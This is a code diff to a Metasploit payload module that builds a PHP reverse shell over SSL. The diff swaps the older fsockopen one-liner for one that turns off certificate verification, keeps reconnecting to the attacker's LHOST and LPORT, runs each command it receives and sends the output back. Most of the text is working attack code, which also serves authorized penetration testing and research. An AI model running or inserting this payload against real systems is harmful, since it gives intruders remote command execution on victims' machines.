@@ -1,16 +1,15 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/reverse_tcp_ssl'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 132
+  CachedSize = 253
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -50,7 +49,6 @@ module MetasploitModule
     lhost = datastore['LHOST']
     ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    cmd = "php -r '$s=fsockopen(\"ssl://#{datastore['LHOST']}\",#{datastore['LPORT']});while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}'&"
+    cmd = "php -r '$ctxt=stream_context_create([\"ssl\"=>[\"verify_peer\"=>false]]);while($s=@stream_socket_client(\"ssl://#{datastore['LHOST']}:#{datastore['LPORT']}\",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}}'&"
   end
-
 end
